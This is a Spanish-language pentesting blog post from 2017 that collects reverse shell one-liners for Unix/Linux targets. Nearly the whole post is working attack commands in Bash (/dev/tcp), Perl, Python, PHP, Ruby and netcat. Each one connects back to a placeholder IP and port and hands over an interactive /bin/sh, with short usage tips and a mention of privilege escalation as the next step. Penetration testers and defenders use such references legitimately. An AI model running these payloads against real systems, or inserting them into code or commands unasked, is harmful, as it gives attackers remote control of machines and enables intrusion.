---
title: "Como obtener una reverse shell"
description: "Que es una Reverse Shell? Cuando logramos ejecutar comandos de manera remota en un equipo nuestro objetivo principal es obtener una Reverse Shell conectándose a el equipo local…"
pubDate: 2017-12-26
updatedDate: 2018-01-04
author: "Miguel Zabala"
tags: ["Pentesting", "Reverse Shell"]
legacyUrl: "https://nullsectorblog.co/como-obtener-una-reverse-shell/"
---
# Que es una Reverse Shell?

![Como obtener una reverse shell](/investigacion/como-obtener-una-reverse-shell/Bash-new.sh_.png)

Cuando logramos ejecutar comandos de manera remota en un equipo nuestro objetivo principal es obtener una Reverse Shell conectándose a el equipo local mediante un puerto en escucha, posterior a esto proceder con el escalado de privilegios, a continuación una muy útil recopilación de posibles shell en diferentes lenguajes según el entorno de la maquina a la cual se ejecutara la shell

Para poder lograr la ejecucion correcta de estos comandos debes realizar los cambios de los caracteres que resalto en rojo, recuerda que debes remplazar inclusive los <>

-   ip = Ip de la maquina que recibirá la shell
-   port = puerto que esta en escucha en la maquina que recibe la shell

## Entornos Unix/Linux

### Bash

Detalles: Algunas versiones de Bash pueden enviarte una reverse shell

bash -i >& /dev/tcp/<ip>/<port> 0>&1

### Perl

Detalles: Si el sistema objetivo tiene l Perl es posible crear una reverse shell con el siguiente comando

perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### Python

Detalles: Esta versión solo es disponible para Python 2.7 para obtener la shell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

### PHP

Detalles:Si puedes ejecutar codigo remoto desde un servicio que soporte PHP es muy probable que puedas obtener la shell con el siguiente codigo

php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

### Ruby

Detalles: ocasionalmente si intento invocar una reverse shell con ruby genera error por lo tanto evito usarla, si te funciona buen provecho

ruby -rsocket -e'f=TCPSocket.open("<ip>",<port>).to\_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

### Netcat

Detalles: Es muy poco común que en un entorno real nos encontremos con el servicio de netcat activo, sin embargo si logras encontrarlo puede ser muy util

nc -e /bin/sh <ip> <port>

Depende del entorno en el cual estés trabajando puedes utilizar alguno de estos códigos para obtener una reverse shell, recuerda que los resultados varían según las características.

Cordialmente

**0x00Sector!**

Fuente [pentestmonkey](http://pentestmonkey.net/)

[Social](https://nullsector.co/wp-admin/post.php?post=1&action=edit#wpseo-meta-section-social)

[Social](https://nullsector.co/wp-admin/post.php?post=1&action=edit#wpseo-meta-section-social)
